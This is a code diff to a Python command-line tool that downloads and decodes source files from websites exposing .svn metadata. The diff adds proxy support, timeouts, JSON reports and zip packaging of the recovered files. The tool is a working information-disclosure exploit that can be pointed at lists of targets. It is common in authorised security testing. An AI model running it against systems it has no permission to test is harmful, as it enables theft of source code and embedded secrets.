@@ -6,6 +6,8 @@ import requests
 import os
 import gzip
 import argparse
+import json
+import shutil
 from urllib.parse import urljoin
 from datetime import datetime
 import urllib3
@@ -24,14 +26,18 @@ def print_logo():
         Recover source from leaked .svn metadata
 """)
 
-def fetch_entries(url):
+def fetch_entries(url, proxies=None):
     entries_url = urljoin(url, '.svn/entries')
     print(f'[+] Fetching entries from: {entries_url}')
-    response = requests.get(entries_url, verify=False)
-    if response.status_code != 200:
-        print('[-] Failed to fetch entries. HTTP', response.status_code)
+    try:
+        response = requests.get(entries_url, verify=False, proxies=proxies, timeout=10)
+        if response.status_code != 200:
+            print('[-] Failed to fetch entries. HTTP', response.status_code)
+            return None
+        return response.text
+    except Exception as e:
+        print(f'[-] Error fetching entries: {e}')
         return None
-    return response.text
 
 def parse_entries(entries_content):
     lines = entries_content.splitlines()
@@ -90,38 +96,55 @@ def save_html_report(report_data, outdir, template_path):
         f.write(html_content)
     print(f"[+] HTML report saved to {out_path}")
 
-def download_and_decode(base_url, filepath, outdir='recovered'):
+def save_json_report(report_data, outdir):
+    out_path = os.path.join(outdir, f'report_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json')
+    with open(out_path, 'w', encoding='utf-8') as f:
+        json.dump(report_data, f, indent=2)
+    print(f"[+] JSON report saved to {out_path}")
+
+def package_output(outdir):
+    zipname = os.path.join(outdir, f"recovered_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip")
+    shutil.make_archive(zipname.replace('.zip', ''), 'zip', outdir)
+    print(f"[+] Packaged output into: {zipname}")
+
+def download_and_decode(base_url, filepath, outdir='recovered', proxies=None):
     os.makedirs(outdir, exist_ok=True)
     svn_url = urljoin(base_url, f'.svn/text-base/{filepath}.svn-base')
     output_path = os.path.join(outdir, filepath)
 
     print(f'[+] Downloading: {svn_url}')
-    r = requests.get(svn_url, verify=False)
-    if r.status_code != 200:
-        print(f'[-] Failed to download {filepath} (HTTP {r.status_code})')
-        return {'file': filepath, 'status': 'FAILED', 'size': len(r.content), 'saved_as': None}
+    try:
+        r = requests.get(svn_url, verify=False, proxies=proxies, timeout=10)
+        if r.status_code != 200:
+            print(f'[-] Failed to download {filepath} (HTTP {r.status_code})')
+            return {'file': filepath, 'status': 'FAILED', 'size': 0, 'saved_as': None}
 
-    content = try_decode(r.content)
-    if content:
-        os.makedirs(os.path.dirname(output_path), exist_ok=True)
-        with open(output_path, 'w', encoding='utf-8') as f:
-            f.write(content)
-        print(f'[+] Saved decoded file: {output_path}')
-        return {'file': filepath, 'status': 'OK', 'size': len(r.content), 'saved_as': output_path}
-    else:
-        print(f'[-] Could not decode: {filepath}')
-        return {'file': filepath, 'status': 'UNDECODABLE', 'size': len(r.content), 'saved_as': None}
+        content = try_decode(r.content)
+        if content:
+            os.makedirs(os.path.dirname(output_path), exist_ok=True)
+            with open(output_path, 'w', encoding='utf-8') as f:
+                f.write(content)
+            print(f'[+] Saved decoded file: {output_path}')
+            return {'file': filepath, 'status': 'OK', 'size': len(r.content), 'saved_as': output_path}
+        else:
+            print(f'[-] Could not decode: {filepath}')
+            return {'file': filepath, 'status': 'UNDECODABLE', 'size': len(r.content), 'saved_as': None}
+    except Exception as e:
+        print(f'[-] Error downloading file: {e}')
+        return {'file': filepath, 'status': 'FAILED', 'size': 0, 'saved_as': None}
 
-def process_url(base_url, outdir, template_path):
-    entries = fetch_entries(base_url)
+def process_url(base_url, outdir, template_path, proxies):
+    entries = fetch_entries(base_url, proxies)
     if not entries:
         return
     files = parse_entries(entries)
     print(f'[+] Found {len(files)} files:')
     for f in files:
         print('  -', f)
-    results = [download_and_decode(base_url, f, outdir) for f in files]
+    results = [download_and_decode(base_url, f, outdir, proxies) for f in files]
     save_html_report(results, outdir, template_path)
+    save_json_report(results, outdir)
+    package_output(outdir)
 
 def main():
     print_logo()
@@ -129,15 +152,18 @@ def main():
     parser.add_argument('-u', '--url', help='Single target URL')
     parser.add_argument('-l', '--list', help='File with list of URLs')
     parser.add_argument('-o', '--out', default='recovered', help='Output directory')
-    parser.add_argument('-t', '--template', default='html_report_template.html', help='Path to HTML template')
+    parser.add_argument('-t', '--template', default='cli/html_report_template.html', help='Path to HTML template')
+    parser.add_argument('--proxy', help='HTTP proxy (e.g. http://127.0.0.1:8080)', default=None)
 
     args = parser.parse_args()
     if not args.url and not args.list:
         parser.error('Specify either -u for a single URL or -l for a file of URLs.')
 
+    proxies = {'http': args.proxy, 'https': args.proxy} if args.proxy else None
+
     urls = [args.url] if args.url else open(args.list).read().splitlines()
     for url in urls:
-        process_url(url.strip(), args.out, args.template)
+        process_url(url.strip(), args.out, args.template, proxies)
 
 if __name__ == '__main__':
     main()
